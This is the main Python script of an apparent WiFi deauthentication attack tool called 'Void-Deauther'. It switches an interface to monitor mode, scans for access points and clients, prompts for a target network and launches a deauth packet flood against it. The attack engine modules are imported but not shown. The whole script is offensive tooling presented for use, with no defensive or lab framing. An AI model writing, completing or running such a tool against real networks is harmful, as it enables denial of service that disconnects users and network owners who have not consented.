import sys
import argparse
from modules.interface_manager import InterfaceManager
from modules.scanner import Scanner
from modules.deauth_engine import DeauthEngine
from modules.channel_hopper import ChannelHopper
from modules.ui_manager import UIManager
from rich.live import Live
import time

def main():
    parser = argparse.ArgumentParser(description="Void-Deauther - Advanced WiFi Deauthentication Tool")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface to use")
    args = parser.parse_args()

    im = InterfaceManager(args.interface)
    ui = UIManager()
    
    ui.banner()
    
    print(f"[*] Setting {args.interface} to monitor mode...")
    im.set_monitor_mode(True)
    
    scanner = Scanner(args.interface)
    hopper = ChannelHopper(im)
    engine = DeauthEngine(args.interface)

    print("[*] Starting Scan (Press Ctrl+C to stop scanning)...")
    scanner.start()
    hopper.start()

    try:
        with Live(ui.display_scanning({}, {}), refresh_per_second=4, transient=True) as live:
            while True:
                aps, clients = scanner.get_results()
                live.update(ui.display_scanning(aps, clients))
                time.sleep(0.5)
    except KeyboardInterrupt:
        scanner.stop()
        hopper.stop()
        print("\n[*] Scanning stopped.")

    aps, clients = scanner.get_results()
    if not aps:
        print("[!] No networks found. Exiting.")
        im.set_monitor_mode(False)
        return

    # Simple selection logic for demo purposes
    # In a real tool, we would have an interactive selection menu here
    print("\n[*] Available Targets:")
    for i, (bssid, info) in enumerate(aps.items()):
        print(f"{i}. {info['ssid']} [{bssid}]")

    try:
        choice = int(input("\nSelect AP index to attack (or -1 to exit): "))
        if choice == -1:
            im.set_monitor_mode(False)
            return
        
        target_bssid = list(aps.keys())[choice]
        target_ssid = aps[target_bssid]['ssid']
        
        print(f"[*] Attacking {target_ssid} [{target_bssid}]...")
        print("[*] Sending deauth packets (Press Ctrl+C to stop)...")
        engine.attack_bssid(target_bssid)
        
    except KeyboardInterrupt:
        print("\n[*] Attack stopped.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        im.set_monitor_mode(False)
        print("[*] Interface restored to managed mode. Goodbye.")

if __name__ == "__main__":
    main()
